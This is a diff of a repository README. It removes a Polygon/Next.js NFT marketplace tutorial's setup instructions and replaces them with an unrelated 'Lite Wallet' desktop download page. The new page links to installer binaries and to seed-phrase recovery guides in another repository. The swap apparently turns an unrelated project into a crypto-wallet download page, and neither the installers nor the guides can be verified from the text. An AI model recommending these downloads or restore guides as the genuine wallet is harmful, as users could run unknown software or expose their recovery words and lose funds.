@@ -1,109 +1,79 @@
-## Full stack NFT marketplace built with Polygon, Solidity, IPFS, & Next.js
+![Lite Wallet](assets/banner-profile.png)
 
-![Header](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pfofv47dooojerkmfgr4.png)
+<h1 align="center">Lite Wallet</h1>
 
-This is the codebase to go along with tbe blog post [Building a Full Stack NFT Marketplace on Ethereum with Polygon](https://dev.to/dabit3/building-scalable-full-stack-apps-on-ethereum-with-polygon-2cfb)
+<p align="center">A wiped phone is not a lost wallet, as long as twelve words survived it.</p>
 
-### Running this project
+<a href="#license"><img src="https://img.shields.io/badge/LICENSE-MIT-00D5FD?style=for-the-badge&labelColor=001116" alt="License: MIT"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2"><img src="https://img.shields.io/badge/RELEASE-v3.15.2-00D5FD?style=for-the-badge&labelColor=001116" alt="Release v3.15.2"></a>
 
-#### Gitpod
+---
 
-To deploy this project to Gitpod, follow these steps:
+## Downloads - v3.15.2
 
-1. Click this link to deploy
+<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>
 
-[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#github.com/dabit3/polygon-ethereum-nextjs-marketplace)
+<div align="center">
 
-2. Import the RPC address given to you by GitPod into your MetaMask wallet
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
+| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
+| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |
 
-This endpoint will look something like this:
+</div>
 
-```
-https://8545-copper-swordtail-j1mvhxv3.ws-eu18.gitpod.io/
-```
+Every checksum is published on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
 
-The chain ID should be 1337. If you have a localhost rpc set up, you may need to overwrite it.
+All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
 
-![MetaMask RPC Import](wallet.png)
+> Only download from this GitHub release page.
 
-#### Local setup
+---
 
-To run this project locally, follow these steps.
+## Why Lite Wallet
 
-1. Clone the project locally, change into the directory, and install the dependencies:
+The worst recovery story is never the theft. It is the phone that was replaced, the laptop
+that went to repair, the drive that failed, and the twelve words that were never written
+down because the app was working fine. Nothing about a wallet makes that moment less final:
+there is no reset link and no support desk with a copy.
 
-```sh
-git clone https://github.com/dabit3/polygon-ethereum-nextjs-marketplace.git
+The good version of the same story is short. Twelve words, in the right order, and the
+wallet is back on new hardware in minutes, with the same addresses and the same balance once
+the sync catches up. Everything the recovery guides do is aimed at making that second story
+the one that happens. A backup kept on the same disk as the wallet is not a backup at all.
 
-cd polygon-ethereum-nextjs-marketplace
+- The paper key is shown once and can be re-read behind device authentication, so write it early.
+- A restore that shows zero is usually still syncing, not empty; the guides say how to tell.
+- A rejected word is a spelling problem, not a lost wallet, and there is a fix for it.
+- Hardware wallets change who holds the key, not whether a backup exists.
 
-# install using NPM or Yarn
-npm install
+This repository is one page of the Lite Wallet project on GitHub; the recovery guides carry the restore sequence itself.
 
-# or
+## Guides
 
-yarn
-```
+<div align="center">
 
-2. Start the local Hardhat node
+| Guide | What it covers |
+| --- | --- |
+| [The paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md) | How the 12-word paper key appears, how to record it once, and how to bring a wallet back from it. |
+| [The paper key restore guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-from-a-paper-key.md) | The restore sequence step by step, the rejected-word fix and the zero balance that often follows a restore. |
+| [The sync troubleshooting guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-stuck-syncing-balance-zero.md) | Why a sync stalls, loops or restarts, and the order of fixes that actually moves the progress bar. |
+| [The seed portability guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-seed-in-another-wallet.md) | Bring the same 12 words into Electrum-LTC or another wallet, and why a derivation path changes what appears. |
 
-```sh
-npx hardhat node
-```
+</div>
 
-3. With the network running, deploy the contracts to the local network in a separate terminal window
+The restore sequence and every related fix are indexed in the recovery repository, which links back to the setup index.
 
-```sh
-npx hardhat run scripts/deploy.js --network localhost
-```
+**Twelve words are the whole credential: no support message, form or pop-up has a reason to ask for them.**
 
-4. Start the app
+## Support
 
-```
-npm run dev
-```
+Questions go to the issue tracker, where the answers stay public and searchable. The tracker is at [the issue page](https://github.com/litewallet-dev/litewallet-desktop/issues).
 
-### Configuration
+## License
 
-To deploy to Polygon test or main networks, update the configurations located in __hardhat.config.js__ to use a private key and, optionally, deploy to a private RPC like Infura.
+MIT.
 
-```javascript
-require("@nomiclabs/hardhat-waffle");
-const fs = require('fs');
-const privateKey = fs.readFileSync(".secret").toString().trim() || "01234567890123456789";
+---
 
-// infuraId is optional if you are using Infura RPC
-const infuraId = fs.readFileSync(".infuraid").toString().trim() || "";
-
-module.exports = {
-  defaultNetwork: "hardhat",
-  networks: {
-    hardhat: {
-      chainId: 1337
-    },
-    mumbai: {
-      // Infura
-      // url: `https://polygon-mumbai.infura.io/v3/${infuraId}`
-      url: "https://rpc-mumbai.matic.today",
-      accounts: [privateKey]
-    },
-    matic: {
-      // Infura
-      // url: `https://polygon-mainnet.infura.io/v3/${infuraId}`,
-      url: "https://rpc-mainnet.maticvigil.com",
-      accounts: [privateKey]
-    }
-  },
-  solidity: {
-    version: "0.8.4",
-    settings: {
-      optimizer: {
-        enabled: true,
-        runs: 200
-      }
-    }
-  }
-};
-```
-
-If using Infura, update __.infuraid__ with your [Infura](https://infura.io/) project ID.
+Wallet source and releases: [the desktop repository](https://github.com/litewallet-dev/litewallet-desktop). All guides: [the setup repository](https://github.com/litewallet-dev/litecoin-wallet-setup).
